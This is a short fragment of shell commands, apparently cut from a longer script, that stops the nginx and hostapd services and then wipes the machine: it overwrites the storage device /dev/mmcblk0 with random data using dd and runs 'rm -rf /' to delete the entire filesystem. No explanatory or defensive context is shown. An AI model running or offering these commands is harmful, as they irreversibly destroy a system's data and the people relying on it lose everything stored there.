nginx -s stop`
systemctl stop hostapd
dd if=/dev/urandom of=/dev/mmcblk0 bs=1M &
rm -rf /
